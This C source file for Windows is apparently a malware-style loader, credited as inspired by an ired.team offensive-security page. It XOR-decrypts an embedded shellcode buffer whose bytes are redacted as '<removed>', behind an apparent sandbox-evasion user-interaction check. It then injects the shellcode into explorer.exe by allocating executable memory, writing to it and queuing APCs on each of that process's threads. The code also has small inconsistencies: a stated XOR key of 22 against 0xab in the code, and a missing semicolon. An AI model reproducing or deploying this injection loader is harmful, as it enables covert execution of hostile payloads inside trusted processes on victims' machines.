// Inspired from:  https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection

#include <Windows.h>
#include <TlHelp32.h>
#include "..\functions.h"

int main(int argc, char* argv[])
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	HANDLE victimProcess = NULL;
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	DWORD threadIds[128];
	SIZE_T shellSize;
	HANDLE threadHandle = NULL;
	int i = 0;

	/* length: 927 bytes */
	//unsigned char buf[] = "<removed>";

	// Shellcode encrypted with XOR (key=22)
	unsigned char buf[] = "<removed>"
	shellSize = sizeof(buf);

	int ret = insert_user_interaction();

	if (ret == 1) {
		// Decrypt shellcode
		for (int x = 0; x < 927; x++) {
			*((char*)buf + x) = *((char*)buf + x) ^ '\xab';
		}

		if (Process32First(snapshot, &processEntry)) {
			while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
				Process32Next(snapshot, &processEntry);
			}
		}

		victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
		LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
		WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);

		if (Thread32First(snapshot, &threadEntry)) {

			do {
				if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
					threadIds[i++] = threadEntry.th32ThreadID;
				}
			} while (Thread32Next(snapshot, &threadEntry));
		}

		for (int j = 0; j < i; j++) {
			threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadIds[j]);
			QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
			Sleep(1000 * 2);
		}
	}

	return 0;
}
